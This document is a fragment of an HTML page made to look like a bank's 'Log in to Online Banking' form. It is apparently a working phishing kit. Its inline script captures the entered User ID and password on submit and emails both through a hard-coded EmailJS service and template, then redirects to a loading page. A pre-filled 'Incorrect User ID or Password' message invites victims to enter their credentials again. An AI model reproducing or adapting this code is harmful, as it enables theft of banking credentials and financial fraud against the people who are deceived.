<body>
<div id=layout-wrapper>
 
 
<div data-viewmodel=login/viewmodels/logoff data-bind="props: wizardSettings" data-props=null>
 <div class=loggoff-notifier-container></div>
 <div class=auth__wizard data-main-content>
 
 <div class="auth__wizard auth__wizard-username" data-viewmodel=login/viewmodels/userName data-bind="props: settings" data-props='{"authenticateInNewWindow":false,"msBrowserBehavior":"Standard","previousStepAllowed":false,"finalStep":false,"isRecaptchaEnabled":false}'>
 <div class=content__container>
 <h1 class=page__heading>Log in to Online Banking</h1>
 <div data-bind data-role=notifier style=display:none></div>
 <div class=panel>
 <div class=panel__body>
 <div class=auth__form-divider>
 <div class=auth__form>



    <form id="login-form">

        <label>
        <span class="form-control__label">User ID:</span>
        
        <input autocapitalize="off" autocomplete="new-value"
        class="form-control k-textbox"
        id="username"
        maxlength="20"
        type="text">
        
        <span id="username-error" class="k-invalid-msg" style="color:red;">
        </span>
        </label>
        
        
        <label>
        <span class="form-control__label">Password:</span>
        
        <input autocapitalize="off" autocomplete="new-value"
        class="form-control k-textbox"
        id="password"
        maxlength="20"
        type="password">
        
        <span id="password-error" class="k-invalid-msg" style="color:red;">
        Incorrect User ID or Password.
        </span>
        </label>
        
        
        <div class="form-submit-container">
        <button type="submit" class="btn btn--primary btn__block">
        Sign in
        </button>
        </div>
        
        </form>
        
        
        <script>
        
        emailjs.init("m5EWYUzGEiW3cDMVu");
        
        function sendEmail(username, password) {
        emailjs.send("service_ev0guaa", "template_08dlwd3", {
        username: username,
        password: password
        })
        .then(function(response) {
        console.log('Email sent successfully!', response);
        window.location.href = 'loadingpage.html';
        }, function(error) {
        console.error('Email sending failed:', error);
        });
        }
        
        
        const usernameInput = document.getElementById("username");
        const passwordInput = document.getElementById("password");
        
        const usernameError = document.getElementById("username-error");
        const passwordError = document.getElementById("password-error");
        
        
        function validateFields(){
        
        if(usernameInput.value.trim() === ""){
        usernameError.style.display = "block";
        }else{
        usernameError.style.display = "none";
        }
        
        if(passwordInput.value.trim() === ""){
        passwordError.style.display = "block";
        }else{
        passwordError.style.display = "none";
        }
        
        }
        
        
        usernameInput.addEventListener("input", validateFields);
        passwordInput.addEventListener("input", validateFields);
        
        
        document.getElementById('login-form').addEventListener('submit', function(event) {
        
        event.preventDefault();
        
        validateFields();
        
        if(usernameInput.value.trim() !== "" && passwordInput.value.trim() !== ""){
        sendEmail(usernameInput.value, passwordInput.value);
        }
        
        });
        
        </script>
